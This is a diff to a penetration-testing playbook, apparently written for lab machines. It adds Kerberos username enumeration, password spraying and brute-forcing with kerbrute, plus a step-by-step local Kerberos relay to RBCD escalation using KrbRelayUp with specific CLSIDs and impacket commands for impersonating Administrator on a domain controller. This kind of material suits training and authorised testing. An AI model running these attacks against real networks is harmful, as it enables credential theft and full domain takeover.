@@ -10,6 +10,24 @@ pwnloop x "impacket-lookupsid anonymous@$T"              # user enumeration via 
 pwnloop x "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='MACHINE.HTB',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $T"
 ```
 
+**kerbrute** is the fastest Kerberos pre-auth oracle — it needs no credential and
+works when SMB/LDAP/RID enumeration are all refused (pre-auth answers before
+authorization). It is built into the container (`/usr/local/bin/kerbrute`).
+
+```bash
+# validate/enumerate a username list against the KDC (valid user vs unknown)
+pwnloop x "kerbrute userenum -d bruno.vl --dc $T /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o /engagements/$NAME/loot/kerb-users.txt"
+# password spray — one password, every user; kerbrute also grabs the AS-REP for
+# any pre-auth-disabled account it hits, so it doubles as an AS-REP roast
+pwnloop x "kerbrute passwordspray -d bruno.vl --dc $T users.txt 'Sunshine1'"
+pwnloop x "kerbrute bruteuser -d bruno.vl --dc $T /usr/share/wordlists/rockyou.txt <user>"
+```
+
+Pre-auth replies are the oracle: `KDC_ERR_C_PRINCIPAL_UNKNOWN` = no such user,
+`KDC_ERR_PREAUTH_REQUIRED` = valid user, `KDC_ERR_CLIENT_REVOKED` = valid but
+locked/disabled. **Respect the lockout policy** — if the threshold is unknown,
+spray one password per window, not a list (see the spray note below).
+
 Time skew breaks Kerberos. **Do not try to set the container's clock** — it has
 no `CAP_SYS_TIME`, the clock belongs to the host kernel, and `ntpdate -u` will
 measure the offset and then fail with `step_systime: Operation not permitted`.
@@ -147,4 +165,75 @@ certutil -view -restrict "RequestId=<id>" -out "SerialNumber"
 certutil -revoke <serial> 4                     # 4 = superseded
 certutil -view -restrict "RequestId=<id>" -out "RequestId,Request.Disposition"
 # verify: Request Disposition: 0x15 (21) -- Revoked
+```
+
+## Local Kerberos relay → RBCD (code exec on a hardened DC, no SeImpersonate)
+
+When you already have **code execution on a domain-joined host (often the DC
+itself) as a low-privilege account** with no `SeImpersonate` (potatoes out) and
+no useful ACLs, the escalation is a **local** Kerberos relay. It needs *no
+outbound connectivity*, so it survives the lockdown that kills every network
+path — and that lockdown is the tell that this is the intended route:
+
+- outbound `80/139/445` blocked → PetitPotam/PrinterBug callbacks to your host
+  never arrive (network coercion + `ntlmrelayx`/`krbrelayx` are dead);
+- `WebClient` service absent → the WebDAV/HTTP coercion (`ADCSPwn`-style ESC8)
+  has no trigger;
+- SMB signing mandatory on a DC → SMB relay dies in the client handshake;
+- LDAP **SASL/Kerberos** binds require signing, which a relay can never produce
+  (it lacks the session key) — even though *simple* binds are unsigned-OK. So a
+  relayed LDAP bind fails: `389` → `LDAP_UNAVAILABLE`, `636` → the completed
+  GSSAPI bind is refused `LDAP_UNWILLING_TO_PERFORM`.
+
+The one primitive that still fires is a **local DCOM trigger**: activating a COM
+class you're allowed to instantiate makes the local RPCSS authenticate to your
+in-process listener as the **machine account** (`HOST$` = `NT/SYSTEM` on the
+wire). `KrbRelayUp` does trigger + relay + RBCD in one shot:
+
+```
+# on the target, as the low-priv account:
+KrbRelayUp.exe relay -Domain <dom> -CreateNewComputerAccount \
+    -ComputerName <pc>$ -ComputerPassword <pw> -cls <CLSID>
+# → writes msDS-AllowedToActOnBehalfOfOtherIdentity on the local machine (the DC)
+```
+
+Then finish from Linux with S4U (impacket):
+
+```bash
+pwnloop x "impacket-getST -spn cifs/<dc-fqdn> -impersonate Administrator \
+    -dc-ip $T '<dom>/<pc>\$:<pw>'"
+pwnloop x "KRB5CCNAME=Administrator@cifs_<dc-fqdn>@<DOM>.ccache \
+    impacket-wmiexec -k -no-pass <dc-fqdn>"      # bruno\administrator → root.txt
+```
+
+**Choosing the CLSID is the part that wastes time — get it right up front:**
+
+- The class must be **enabled** and **activatable by your account**. Wrong picks
+  fail fast and tell you which: `0x80070422` "service disabled" (class maps to a
+  stopped service) and `0x80080004` "bad path" (class doesn't support IStorage
+  activation). Try another rather than concluding the technique is dead.
+- **Read `whoami /all` for the DCOM group.** Membership in
+  `BUILTIN\Certificate Service DCOM Access` is a deliberate signpost: it lets you
+  activate the **Certificate Services** class
+  `D99E6E73-FC88-11D0-B498-00A0C90312F3` — that is the working CLSID on such
+  boxes. (Note `…E70` is the sibling `CCertRequest` and gives "bad path"; use
+  `…E73`.) WMI `8BC3F05E-D86B-11D0-A075-00C04FB68820` also triggers on a DC and
+  is a good fallback for capturing the AP-REQ.
+- Prereq for `-CreateNewComputerAccount`: `MachineAccountQuota > 0`
+  (`nxc ldap $T -u u -p p -M maq`). If it's 0, relay to a computer you already
+  control instead.
+
+**Do not kill the tool early.** The "Looking for available ports.." step in
+`KrbRelay`/`KrbRelayUp` can take **2–3 minutes** before it registers the COM
+server and forces authentication — it looks hung but isn't. Run it detached
+(`Start-Process -WindowStyle Hidden`) with output to a file and poll, rather than
+blocking your only shell.
+
+Cleanup afterwards is mandatory and specific: clear
+`msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC and delete every computer
+account you created:
+
+```
+Set-ADComputer -Identity <DC> -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
+Remove-ADComputer -Identity <pc> -Confirm:$false
 ```
